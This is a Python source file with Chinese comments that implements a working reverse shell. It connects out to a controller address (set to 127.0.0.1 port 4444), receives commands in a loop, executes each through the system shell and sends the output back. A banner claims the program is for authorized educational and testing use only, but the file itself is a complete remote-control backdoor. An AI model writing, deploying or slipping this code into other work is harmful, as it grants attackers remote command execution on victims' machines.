import socket
import subprocess
import sys

# 反向连接函数
def reverse_shell():
    try:
        # 配置控制端的 IP 和端口
        host = '127.0.0.1'
        port = 4444

        # 创建一个 socket 对象
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # 连接到控制端
        s.connect((host, port))
        # 发送连接成功的消息
        s.send(b"[*] Connection established! Ready to receive commands.\n")

        # 循环接收命令并执行
        while True:
            # 接收命令（最大 1024 字节）
            command = s.recv(1024).decode('utf-8', errors='ignore').strip()
            if not command:
                continue
            # 如果命令是退出，则退出循环
            if command.lower() in ['exit', 'quit', 'bye']:
                s.send(b"[*] Session will be closed. Goodbye.\n")
                break

            # 执行命令
            try:
                # 使用 subprocess 执行命令，捕获输出和错误
                output = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    text=True
                )
            except subprocess.CalledProcessError as e:
                output = f"[Error] Command execution failed: {e.output}"
            except Exception as e:
                output = f"[Error] Unexpected error: {str(e)}"

            # 发送输出结果，包含分隔符便于服务端识别
            s.send(f"{output}\n[END_OF_OUTPUT]\n".encode())

    except socket.error as e:
        print(f"Socket 错误: {e}")
    except Exception as e:
        print(f"发生错误: {e}")
    finally:
        # 关闭连接
        s.close()
        print("[*] 连接已关闭")

if __name__ == "__main__":
    print("""
    [警告] 本程序仅用于合法授权的教育与测试场景！
    未经授权使用将违反法律法规和道德准则。
    """)
    reverse_shell()